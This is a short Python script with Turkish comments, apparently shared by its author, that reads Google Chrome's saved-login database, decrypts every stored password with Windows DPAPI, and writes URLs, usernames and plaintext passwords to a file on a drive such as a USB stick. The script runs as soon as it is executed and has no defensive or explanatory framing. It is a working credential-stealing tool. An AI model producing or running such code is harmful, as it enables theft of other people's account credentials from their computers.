import os
import sqlite3
import win32crypt
from win32crypt import CryptUnprotectData

def get_chrome_passwords():
    # Chrome şifrelerinin saklandığı dosya
    db_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
    
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    # Kendi USBni ve ya Nereye Kaydetmek İstiyorsan Gir.
    output_path = r'B:\Backup\chrome_passwords.txt'
    if not os.path.exists(os.path.dirname(output_path)):
        os.makedirs(os.path.dirname(output_path))
    
    with open(output_path, 'w', encoding='utf-8') as file:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            # Şifreyi çözmek için veriyi çöz
            try:
                password = CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            except Exception as e:
                password = f"Şifre çözülemedi: {e}"
            
            # Dosyaya yaz
            file.write(f"URL: {url}\n")
            file.write(f"Kullanıcı Adı: {username}\n")
            file.write(f"Şifre: {password}\n\n")
    
    print(f"Şifreler {output_path} dosyasına kaydedildi.")
    
    # Bağlantıyı kapat
    conn.close()

# Chrome şifrelerini al ve dosyaya kaydet
get_chrome_passwords()


# Created by TPàshà
# DC: tpasha_ 
# https://github.com/TPashaxrd